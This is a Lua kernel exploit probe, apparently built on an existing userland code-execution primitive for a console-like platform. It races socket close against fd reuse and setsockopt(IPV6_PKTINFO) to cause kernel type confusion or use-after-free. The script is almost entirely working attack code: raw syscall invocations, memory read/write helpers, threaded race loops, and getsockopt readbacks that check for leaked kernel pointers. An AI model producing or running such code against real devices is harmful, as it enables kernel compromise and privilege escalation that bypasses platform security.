-- CRASH_CLASS: HIGH
-- PROBE 133a: Socket close-vs-setsockopt fd race with threads
--
-- Race: Thread A closes fd, Thread B does setsockopt on same fd.
-- If fd is recycled between close and setsockopt, Thread B operates
-- on the wrong kernel socket struct = type confusion / UAF.
--
-- This is simpler than IPV6_PKTINFO UAF because we don't need to
-- race the internal pktopts pointer — we race the fd table itself.
--
-- Design:
--   1. Create IPv6 socket (fd=X), set PKTINFO
--   2. Thread: close(X) via native.fcall_with_rax
--   3. Main: immediately open new socket (may get fd=X back)
--   4. Main: setsockopt(X, IPV6_PKTINFO) — if X was recycled to
--      a different socket type, this corrupts kernel state
--   5. Check all open sockets for confusion via getsockopt

print("=== PROBE 133a: SOCKET CLOSE RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_sc(num)
    local sc = {}
    for k, v in pairs(syscall.pipe) do sc[k] = v end
    sc.syscall_no = num
    setmetatable(sc, getmetatable(syscall.pipe))
    return sc
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local has_rax = native and native.fcall_with_rax
local stub = has_rax and syscall.pipe.fn_addr or nil
print("has_rax=" .. tostring(has_rax ~= nil))

if not has_rax then
    print("NEED native.fcall_with_rax for fast race — aborting")
    print("=== PROBE 133a COMPLETE ===")
    return
end

local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)

-- ============================================================
-- PHASE 0: Find close wrapper for threads
-- ============================================================
print("")
print("--- PHASE 0: CLOSE WRAPPER ---")

local close_fn = nil
for k, v in pairs(libc_addrofs) do
    local ks = tostring(k):lower()
    if ks:find("close") then
        print("  libc." .. tostring(k) .. " = " .. tostring(v))
        close_fn = v
    end
end
for k, v in pairs(eboot_addrofs) do
    local ks = tostring(k):lower()
    if ks:find("close") then
        print("  eboot." .. tostring(k) .. " = " .. tostring(v))
        if not close_fn then close_fn = v end
    end
end

-- ============================================================
-- PHASE 1: Confirm socketpair works
-- ============================================================
print("")
print("--- PHASE 1: SOCKETPAIR TEST ---")

local sc_socketpair = make_sc(135)
local pair_buf = memory.alloc(16)
memory.write_qword(pair_buf, 0)
memory.write_qword(pair_buf + 8, 0)

-- socketpair(AF_UNIX=1, SOCK_STREAM=1, 0, pair_buf)
local sp_ret = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(pair_buf)))
local fd_a = memory.read_dword(pair_buf)
local fd_b = memory.read_dword(pair_buf + 4)
print("socketpair ret=" .. sp_ret .. " fds=" .. to_num(fd_a) .. "," .. to_num(fd_b))

if sp_ret == 0 then
    native.fcall_with_rax(stub, 6, to_num(fd_a))
    native.fcall_with_rax(stub, 6, to_num(fd_b))
end

-- ============================================================
-- PHASE 2: Fast fd recycle race
-- ============================================================
print("")
print("--- PHASE 2: FD RECYCLE RACE ---")

local AF_INET6 = 28
local AF_INET = 2
local SOCK_DGRAM = 2
local SOCK_STREAM = 1
local IPPROTO_UDP = 17
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46
local SO_SNDBUF = 0x1001
local SOL_SOCKET = 0xFFFF

local ROUNDS = 300
local confusion_count = 0
local pktinfo = memory.alloc(0x20)
local getbuf = memory.alloc(0x40)
local lenbuf = memory.alloc(4)

for round = 1, ROUNDS do
    -- Create IPv6 UDP socket
    local target = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP))
    if target < 0 then print("round " .. round .. ": socket fail"); break end

    -- Set PKTINFO (allocates kernel pktopts)
    memory.write_qword(pktinfo, 0x4141414141414141)
    memory.write_qword(pktinfo + 8, 0x4242424242424242)
    memory.write_dword(pktinfo + 16, 0x43434343)
    native.fcall_with_rax(stub, 105, target, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14)

    -- RACE: close target fd
    native.fcall_with_rax(stub, 6, target)

    -- Immediately create AF_INET (not AF_INET6) TCP socket
    -- If it gets the same fd number, and the kernel still has
    -- a reference from PKTINFO processing, we get type confusion
    local new_fd = to_num(native.fcall_with_rax(stub, 97, AF_INET, SOCK_STREAM, 0))

    if new_fd == target then
        -- Same fd! Try setsockopt(IPV6_PKTINFO) on what is now an AF_INET TCP socket
        local sso = to_num(native.fcall_with_rax(stub, 105, new_fd, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14))

        -- If sso == 0, the kernel applied IPV6_PKTINFO to an AF_INET socket = confusion
        if sso == 0 then
            confusion_count = confusion_count + 1
            print(string.format("round %d: TYPE CONFUSION! fd=%d AF_INET got IPV6_PKTINFO (sso=0)", round, new_fd))

            -- Read back — check for kernel pointer leak
            memory.write_dword(lenbuf, 0x40)
            memory.write_qword(getbuf, 0)
            memory.write_qword(getbuf + 8, 0)
            local gso = to_num(native.fcall_with_rax(stub, 118, new_fd, IPPROTO_IPV6, IPV6_PKTINFO, to_num(getbuf), to_num(lenbuf)))
            if gso == 0 then
                local v0 = safe_rq(getbuf)
                local v1 = safe_rq(getbuf + 8)
                print(string.format("  getsockopt: %s %s%s",
                    fmt_addr(v0), fmt_addr(v1),
                    (is_kptr(v0) and " ***KPTR***" or "")))
            end
        end
    end

    -- Cleanup
    if new_fd >= 0 then
        native.fcall_with_rax(stub, 6, new_fd)
    end

    -- Health check
    if round % 50 == 0 then
        local hok = pcall(function() return to_num(syscall.getpid()) end)
        if not hok then
            print("*** CRASH at round " .. round .. " ***")
            break
        end
        if round % 100 == 0 then
            print("  progress: " .. round .. "/" .. ROUNDS .. " confusions=" .. confusion_count)
        end
    end
end

print("")
print("Total confusions: " .. confusion_count .. " / " .. ROUNDS)

-- ============================================================
-- PHASE 3: Threaded close race (if close_fn available)
-- ============================================================
print("")
print("--- PHASE 3: THREADED CLOSE RACE ---")

if close_fn then
    print("Using thread close fn: " .. tostring(close_fn))
    local t_confusion = 0

    for round = 1, 200 do
        local target = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP))
        if target < 0 then break end

        -- Set PKTINFO
        memory.write_qword(pktinfo, 0)
        memory.write_qword(pktinfo + 8, 0)
        memory.write_dword(pktinfo + 16, 0)
        native.fcall_with_rax(stub, 105, target, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14)

        -- Thread closes, main immediately opens + setsockopt
        local thr = memory.alloc(8)
        memory.write_qword(thr, 0)
        pcall(thrd_create_fn, thr, close_fn, uint64(target))

        -- Immediately try setsockopt on same fd (race with thread's close)
        local sso = to_num(native.fcall_with_rax(stub, 105, target, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14))

        -- Also open new socket to try reclaiming the fd
        local new_fd = to_num(native.fcall_with_rax(stub, 97, AF_INET, SOCK_STREAM, 0))

        sleep(0.01, 's')
        pcall(thrd_join_fn, memory.read_qword(thr), uint64(0))

        if sso == 0 then
            t_confusion = t_confusion + 1
            if t_confusion <= 5 then
                print(string.format("round %d: RACE HIT fd=%d sso=0 new=%d", round, target, new_fd))
            end
        end

        if new_fd >= 0 then
            native.fcall_with_rax(stub, 6, new_fd)
        end

        if round % 50 == 0 then
            if not pcall(function() return to_num(syscall.getpid()) end) then
                print("*** CRASH ***"); break
            end
            print("  t_progress: " .. round .. " hits=" .. t_confusion)
        end
    end

    print("Thread race confusions: " .. t_confusion)
else
    print("No close wrapper found — skipping threaded race")
end

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 133a COMPLETE ===")
